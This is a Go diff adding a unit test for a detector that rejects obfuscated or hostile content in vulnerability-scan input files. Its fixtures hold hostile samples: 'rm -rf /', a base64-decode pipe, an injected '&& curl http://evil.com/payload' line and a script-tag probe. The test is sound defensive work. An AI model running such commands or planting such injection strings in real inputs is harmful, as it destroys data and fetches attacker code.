@@ -492,6 +492,121 @@ func searchString(s, substr string) bool {
 	return false
 }
 
+func TestDetectObfuscatedContent(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	writeFile := func(name, content string) string {
+		path := filepath.Join(tmpDir, name)
+		if err := os.WriteFile(path, []byte(content), 0644); err != nil {
+			t.Fatalf("Failed to create test file: %v", err)
+		}
+		return path
+	}
+
+	// Generate a long base64 string (300 chars of valid base64)
+	longBase64 := ""
+	for i := 0; i < 300; i++ {
+		longBase64 += "A"
+	}
+
+	tests := []struct {
+		name    string
+		path    string
+		wantErr bool
+		errMsg  string
+	}{
+		{
+			"Clean CVE text file",
+			writeFile("clean_cve.txt", "CVE-2021-36159\nCVE-2021-30139\n"),
+			false, "",
+		},
+		{
+			"Clean Trivy JSON",
+			writeFile("clean_trivy.json", `{"SchemaVersion": 2, "Results": [{"Target": "alpine:3.14", "Vulnerabilities": []}]}`),
+			false, "",
+		},
+		{
+			"Clean CycloneDX BOM",
+			writeFile("clean_bom.json", `{"bomFormat": "CycloneDX", "specVersion": "1.4", "components": [{"name": "test", "version": "1.0"}]}`),
+			false, "",
+		},
+		{
+			"Short base64 is OK (checksums)",
+			writeFile("short_b64.json", `{"SchemaVersion": 2, "Results": [], "checksum": "dGhpcyBpcyBhIHNob3J0IGhhc2g="}`),
+			false, "",
+		},
+		{
+			"Long base64 blob rejected",
+			writeFile("long_b64.json", `{"SchemaVersion": 2, "Results": [], "payload": "` + longBase64 + `"}`),
+			true, "base64",
+		},
+		{
+			"Data URI rejected",
+			writeFile("data_uri.json", `{"SchemaVersion": 2, "Results": [], "image": "data:image/png;base64,abc123"}`),
+			true, "data URI",
+		},
+		{
+			"Hex escape sequences rejected",
+			writeFile("hex_escape.txt", `CVE-2021-36159\x41\x42\x43\x44\x45\x46\x47\x48`),
+			true, "hex-encoded",
+		},
+		{
+			"Unicode escapes rejected",
+			writeFile("unicode_escape.txt", `CVE-2021-36159\u0041\u0042\u0043\u0044\u0045`),
+			true, "unicode escape",
+		},
+		{
+			"Script tag rejected",
+			writeFile("script.json", `{"SchemaVersion": 2, "Results": [], "desc": "<script>alert(1)</script>"}`),
+			true, "script",
+		},
+		{
+			"Eval pattern rejected",
+			writeFile("eval.json", `{"SchemaVersion": 2, "Results": [], "desc": "eval(something)"}`),
+			true, "script",
+		},
+		{
+			"Shell shebang rejected",
+			writeFile("shell.txt", "#!/bin/bash\nrm -rf /\n"),
+			true, "shell",
+		},
+		{
+			"Shell piped base64 decode rejected",
+			writeFile("pipe_b64.txt", "CVE-2021-36159\necho payload | base64 -d\n"),
+			true, "shell",
+		},
+		{
+			"Docker layer history is OK (sh -c inside JSON)",
+			writeFile("docker_layer.json", `{"SchemaVersion": 2, "Results": [], "created_by": "/bin/sh -c apk add --no-cache ca-certificates"}`),
+			false, "",
+		},
+		{
+			"Curl injection rejected",
+			writeFile("curl.txt", "CVE-2021-36159\n&& curl http://evil.com/payload\n"),
+			true, "shell",
+		},
+		{
+			"Non-existent file",
+			filepath.Join(tmpDir, "nonexistent.txt"),
+			true, "failed to read",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := DetectObfuscatedContent(tt.path)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("DetectObfuscatedContent() error = %v, wantErr %v", err, tt.wantErr)
+			}
+			if tt.wantErr && err != nil && tt.errMsg != "" {
+				if !contains(err.Error(), tt.errMsg) {
+					t.Errorf("DetectObfuscatedContent() error = %v, want error containing %q", err, tt.errMsg)
+				}
+			}
+		})
+	}
+}
+
 func TestValidateFilePathExists(t *testing.T) {
 	// Create a temporary file for testing
 	tmpDir := t.TempDir()
